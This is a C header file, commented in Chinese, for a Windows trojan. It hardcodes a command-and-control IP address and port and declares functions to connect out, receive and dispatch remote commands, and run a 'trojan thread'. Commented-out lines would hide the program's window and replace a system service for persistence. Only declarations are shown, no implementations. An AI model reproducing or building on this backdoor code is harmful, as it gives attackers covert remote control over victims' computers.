//////////////////////////////////////////////////////////////////////////
//头文件包含
//////////////////////////////////////////////////////////////////////////
#pragma once
#include <WinSock2.h>
#include <Windows.h>
#include <stdio.h>
#include <Tlhelp32.h>
#include <Mswsock.h>
#pragma comment(lib,"WS2_32.lib")
#pragma comment(lib,"Mswsock.lib")
//#pragma comment(linker, "/subsystem:windows /entry:main")
//////////////////////////////////////////////////////////////////////////
//全局变量和宏定义部分
//////////////////////////////////////////////////////////////////////////
#define DESTIP "202.202.5.241"
#define DESTPORT	1517
#define MAXLENGTH	1024*10
extern char szRecvCmd[MAXLENGTH];
extern char szSendCmd[MAXLENGTH];
extern int dwRecvSize;
extern int dwSendSize;

//////////////////////////////////////////////////////////////////////////
//函数声明部分
//////////////////////////////////////////////////////////////////////////
//连接客户端
SOCKET ConnClient();
//接收命令
BOOL RecvCmd(SOCKET sockfd);
//控制接收固定长度数据
BOOL RecvData(SOCKET sockfd,char* pData,int dwSize);
//发送命令
BOOL SendCmd(SOCKET sockfd,char* pData,int dwSize);
//包分发机制
BOOL DispatchCmd(SOCKET sockfd,int dwSize);
//SOCKET ERROR
BOOL SocketError(SOCKET sockfd);
//木马线程
void TrojanThread(void);
//替换为系统服务
/*void RepService(void);*/